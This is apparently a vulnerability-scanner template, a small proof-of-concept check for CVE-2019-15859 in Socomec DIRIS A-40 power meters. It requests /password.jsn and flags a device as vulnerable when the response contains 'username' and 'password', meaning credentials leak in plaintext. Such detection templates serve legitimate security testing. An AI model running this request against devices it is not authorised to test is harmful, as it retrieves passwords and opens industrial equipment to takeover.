[info]
author = "ave"
description = "AVE-2019-0095 漏洞检测，通过访问 /password.jsn 端点验证 Socomec DIRIS A-40 设备是否存在密码明文泄露"
id = "POC-AVE-2019-0095"
name = "Socomec DIRIS A-40 Password Disclosure PoC"
severity = "critical"
tags = [
    "ave-2019-0095",
    "cve-2019-15859",
]
vuln_id = [
    "CVE-2019-15859",
    "AVE-2019-0095",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/password.jsn"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "username",
    "password",
]
